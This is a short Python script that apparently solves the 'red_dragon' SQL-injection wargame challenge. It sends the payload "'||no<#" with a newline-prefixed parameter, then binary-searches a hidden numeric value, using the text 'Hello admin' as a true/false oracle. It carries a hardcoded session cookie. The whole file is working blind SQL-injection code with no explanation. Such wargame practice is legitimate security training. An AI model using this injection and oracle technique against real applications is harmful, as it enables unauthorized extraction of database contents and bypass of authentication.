from urllib.parse import urlencode
import requests

url = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php"
params ={'id' : "'||no<#" , 'no' : None}
cookies = {'PHPSESSID' : '1t87momi7f10m7tl6kkv6t0lob'}

start,end=100000000,1000000000
while True:
    search = int((start + end)/2)
    params['id'] = "'||no<#"
    params['no'] = "{}{}".format(chr(10),search)
    response = requests.get(url,params=params,cookies=cookies)
    if("Hello admin" not in response.text):
        print("[-] ",params)
        params['id'] = "'||no=#"
        response = requests.get(url,params=params,cookies=cookies)
        if("Hello admin" in response.text):
            print("find the no ",search)
            break
        start = search
    else:
        print("[+] ",params)
        end = search



    response.text[:400]
    
